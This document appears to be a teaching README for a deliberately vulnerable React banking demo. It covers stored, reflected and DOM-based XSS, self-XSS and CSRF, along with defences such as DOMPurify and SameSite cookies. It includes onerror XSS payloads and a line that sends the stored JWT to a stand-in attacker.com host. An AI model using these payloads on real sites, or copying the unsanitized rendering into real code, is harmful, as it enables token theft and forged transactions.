# XSS and CSRF Demo

This lesson is an introduction to Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF), using a simple banking application as an example.

## Preparation

1. Clone the repository and install dependencies:

2. Start the development server `npm run dev`

3. Open your browser and navigate to `http://localhost:5173`.

4. Familiarize yourself with the application structure, focusing on the `src` directory and its components.

5. Get the server code from https://github.com/thinkdaniel/6m-software-m4-node-app-for-devops, install the dependencies with `npm install` and start it with `node index.js`. You can change the username and password in `authController.js` if you prefer.

## JWT Authentication

On login, the backend will return a JWT, and also set a cookie with the token for future authentication. The JWT is used to verify the user's identity and authorize access to protected resources.

In this demo, the JWT is stored in `localStorage` as well as in a cookie. With the JWT in the cookie, the JWT will be sent automatically with each request to the server. Note that it only sends it to the same origin (i.e., the same domain, protocol, and port) as the one that set the cookie.

## XSS

XSS means Cross-Site Scripting, a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

### Stored XSS Demo

A Stored XSS vulnerability occurs when user input is stored on the server (e.g., in a database) and then displayed to other users without proper sanitization. In this demo, we will show how an attacker can exploit this vulnerability by injecting malicious scripts into the comments section.

Our comments section(`Comments` component) allows users to leave feedback using HTML tags. This allows users to format their comments, but it also opens the door for potential XSS attacks if the input is not properly sanitized.

By default, React will escape any HTML tags in user input, preventing them from being rendered as actual HTML. This is a security feature that helps protect against XSS attacks.

```js
comments.map((c, i) => (
  <div key={i} className="mb-2 pl-2">
    <div>👱🏻‍♂️: {c}</div> // HTML content will be displayed as plain text
  </div>
));
```

You can try to add comments like:

```html
hello
<span style="color:red">danger</span>
<a href="http://malicious-site.com">Click here for more CDC vouchers</a>
```

To display HTML comments in React, we need to use `dangerouslySetInnerHTML`.

```js
comments.map((c, i) => (
  <div key={i} className="mb-2 pl-2">
    <div dangerouslySetInnerHTML={{ __html: `👱🏻‍♂️: ${c}` }} />
  </div>
));
```

Now the content will be rendered as HTML.

That means we can even add malicious links:

```html
<a href="https://haveibeenpwned.com/" style="color:blue" target="_blank"
  >Click here for more CDC vouchers</a
>
```

This is where an attacker can inject malicious scripts and carry out a **Stored XSS** attack.

Scripts using `<script>`inserted via `innerHTML` are **inert** in most modern browsers and will not execute. However, attackers still have many other vectors (event handlers, `javascript:` URLs, SVG payloads, CSS `url()` with old engines, etc.).

```html
<!-- Inline <script> added via innerHTML is inert in modern browsers -->
<script>
  alert("This usually will NOT run when injected via innerHTML");
</script>
```

But attackers can use event handlers to execute JavaScript code. For example, the attacker can use an `<img>` tag that has an `onerror` attribute:

```html
<img src="invalid.jpg" onerror="console.log('XSS Attack!')" />
```

This means the attacker can execute JavaScript code in the context of the victim's browser. Remember that we have a JWT stored in `localStorage` and a cookie. The attacker can steal the JWT and send it to their server.

```html
<!-- sending token to attacker -->
<img
  src="invalid.jpg"
  onerror="fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))"
/>
<!-- since we don't have a server for this, just do an alert -->
<img
  src="invalid.jpg"
  onerror="alert('Stolen:'+localStorage.getItem('token'))"
/>
```

This can be dangerous if we don't sanitize the input first. To sanitize the input, we can use a library like DOMPurify to clean the HTML before rendering it.

```js
import DOMPurify from "dompurify";

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c) }} />;
```

DOMPurify is a library that helps sanitize HTML and prevent XSS attacks. It removes any malicious code from the HTML before rendering it in the browser.

### Reflected XSS Demo

A Reflected XSS vulnerability occurs when user input is immediately reflected back to the user without proper sanitization. In this demo, we will show how an attacker can exploit this vulnerability by crafting a malicious URL that includes a script.

In this example, we will use the `Search` component. The `Search` component will read the user's search query from the URL and display it on the page without proper sanitization.

A usual search query will use plain text like this:

```
http://localhost:5173/?q=insurance
```

But an attacker could craft a URL like this:

```
http://localhost:5173/?q=<img src='invalid.jpg' onerror="alert('Gotcha 😈')">
```

The attack payload is reflected from the request (URL) to the response (page) and executed in the victim's browser.

To prevent reflected XSS in React, just avoid using `dangerouslySetInnerHTML` with unsanitized user input. React automatically escapes HTML tags in JSX, and the input will be displayed as plain text.

There is no need to display rich content from the query parameter here, so `DOMPurify` is not needed.

### DOM-based XSS Demo

A DOM-based XSS vulnerability occurs when JavaScript on the client side reads data from the DOM. In `ReadDOMElement` component, data from the DOM (`window.location.hash`) is used without proper sanitization.

If an attacker knows your JavaScript code reads data from a DOM element, and renders it into the page without sanitization, they can create a payload to inject malicious scripts.

If you add a plain text element after the hash, like this `http://localhost:5173/#insurance`, it reads the DOM element and displays it without any issues.

But again, the script could be injected this way: `http://localhost:5173/#<img src=x onerror="alert('Gotcha 😈')">`

In React, interpolation will escape HTML tags. DOM XSS appears when we read from the DOM and write it using `dangerouslySetInnerHTML`.

### Beware of Third Party Scripts

When using third-party scripts, be cautious as they may introduce XSS vulnerabilities. Always review and sanitize any user-generated content before rendering it on the page.

Importing a malicious script could lead to code injection e.g. in `third-party.js`. Even if the script is not malicious, some libraries could be vulnerable to XSS attacks as they may not properly sanitize user input and use `dangerouslySetInnerHTML`.

For this reason, it is recommended to scan your code using tools like Snyk, which will flag out potential vulnerabilities, including XSS risks from third-party packages.

Notable examples of popular npm packages with known XSS vulnerabilities include:

- `jquery`: The popular JavaScript library has had several XSS vulnerabilities over the years.
- `lodash`: A utility library that has had XSS vulnerabilities in some of its templates.
- `react-slick`: A carousel component for React that has had XSS vulnerabilities in the past.
- `ckeditor`: A rich text editor that has had multiple XSS vulnerabilities reported.

## Self-XSS

Self-XSS is a type of attack where the victim is tricked into executing malicious scripts in their own browser, which is a social engineering attack. This can happen when a user is persuaded to paste a malicious script into their browser's console or a web page.

The attacker typically uses social engineering techniques to convince the victim to execute the script. This could involve tricking the user into thinking they are performing a legitimate action, such as debugging a website or testing a feature. Or they might lure them with rewards such as fake prizes or recognition.

This is dangerous because if the user pastes or types code in the console, it is as good as a legit script running in their browser.

## CSRF Demo

Cross-Site Request Forgery (CSRF) is an attack that tricks the victim into submitting a malicious request. It can be used to perform actions on behalf of the user without their consent.

In this demo, we will show how a CSRF attack can be executed by embedding an image in a webpage that makes a request to a different site.

From the earlier part, we know that the JWT is stored in a HttpOnly cookie, which means that it cannot be accessed via JavaScript. This cookie is sent along with every request to the same origin i.e. in this case `http://localhost:3000`.

However, an attacker can take advantage of the fact that the JWT is sent along with every request to the same origin. This means that if the user is tricked into making a request to the server (e.g., by clicking on a link or loading an image), the JWT will be included in the request, and the server will process it as if it came from the legitimate user.

Now we have a `transfer` endpoint in the backend server, which simulates a transfer operation. This gets through only if a valid JWT is present in the request.

Clear any existing JWTs in your HttpOnly cookie first.

Then try accessing `http://localhost:3000/transfer?to=daniel&amount=8888` and check out the response and console in the server.

Without a legitimate JWT, we are not able to perform the transfer operation.

Start the `evil-site/index.html` by using VSCode Live Server. If you click the link, it attempts to send a request to the transfer endpoint. Since it has no JWT, the operation will fail, as you can see in the server console.

Login to the bank app to get a new JWT in your HttpOnly cookie.

Now click the link in the evil site page again. This time, since we have a valid JWT in our HttpOnly cookie, the operation will succeed.

To prevent CSRF attacks, there are a few measures to implement in the backend:

1. **SameSite Cookies**: Set the `SameSite` attribute on cookies to prevent them from being sent along with cross-site requests. Use `SameSite=Lax` by default. Be aware that `Lax` allows cookies on **top‑level GET navigations** (e.g., clicking a link), while `Strict` blocks those too and can break legitimate cross‑site flows.

2. **CSRF Tokens**: Implement anti-CSRF tokens that must be included in state-changing requests. These tokens should be unique to each user session.

3. **Never use GET requests for state-changing operations**: Always use POST, PUT, or DELETE requests for actions that modify data. This makes it harder for attackers to perform CSRF attacks.

By implementing these measures, you can significantly reduce the risk of CSRF attacks in your application.

For our demo, we will just set sameSite cookies to "Strict" to prevent them from being sent along with cross-site requests.

In the backend server, set the `SameSite` attribute on the JWT cookie.

Restart the backend server, then logout and login the application again. Click the link on the evil site page. This time, the request will be blocked because the JWT cookie is not sent along with the cross-site request.

## Additional Resources:

- PortSwigger Web Security Academy: Cross-Site Scripting (XSS) https://portswigger.net/web-security/cross-site-scripting

- PortSwigger Web Security Academy: Cross-Site Request Forgery (CSRF) https://portswigger.net/web-security/csrf
